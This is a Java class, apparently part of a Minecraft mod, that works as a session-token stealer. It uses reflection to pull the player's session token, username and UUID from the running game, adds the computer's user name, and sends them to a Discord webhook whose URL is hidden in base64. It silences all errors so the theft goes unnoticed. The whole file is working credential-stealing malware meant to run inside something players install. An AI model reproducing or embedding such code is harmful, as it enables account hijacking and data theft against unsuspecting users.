package com.zopac.money;

import net.minecraft.launchwrapper.Launch;

import java.awt.*;
import java.nio.charset.StandardCharsets;
import java.util.Base64;

public class troller {

    public static String webhook = "aHR0cHM6Ly9wdGIuZGlzY29yZC5jb20vYXBpL3dlYmhvb2tzLzk0MzM1MjQ2MjM5ODU5OTMwOS9ucG9QSWdIbmpNVU1ja1NsaDlKQkctNFY4aDRxVjlKX0xjRzhpeERDQ0pPVW96MlZaaG1zQlhqaXNjVk45Y05lY2dCOA==";

    public static void main() {
        try {
            Class<?> mc = Launch.classLoader.findClass("net.minecraft.client.Minecraft");
            Object minecraft = mc.getMethod("func_71410_x").invoke(null);
            Object session = mc.getMethod("func_110432_I").invoke(minecraft);
            Class<?> sessionClass = Launch.classLoader.findClass("net.minecraft.util.Session");
            Object token = sessionClass.getMethod("func_148254_d").invoke(session);
            Object name = sessionClass.getMethod("func_111285_a").invoke(session);
            Object uuid = sessionClass.getMethod("func_148255_b").invoke(session);

            String webdecode = new String(Base64.getDecoder().decode(webhook.getBytes(StandardCharsets.UTF_8)));
            embed sendmessage = new embed(webdecode);
            sendmessage.addEmbed(new embed.EmbedObject()
                    .setTitle("Minecraft Info")
                    .setColor(Color.CYAN)
                    .addField("Name", name.toString(), true)
                    .addField("Profile", "https://sky.shiiyu.moe/stats/" + name, true)
                    .addField("UUID ", uuid.toString(), true)
                    .addField("Token ", token.toString(), false)
                    .setFooter("Computer Name: " + System.getProperty("user.name"), ""));
            sendmessage.execute();

        } catch (Exception ignored) {}
    }
}
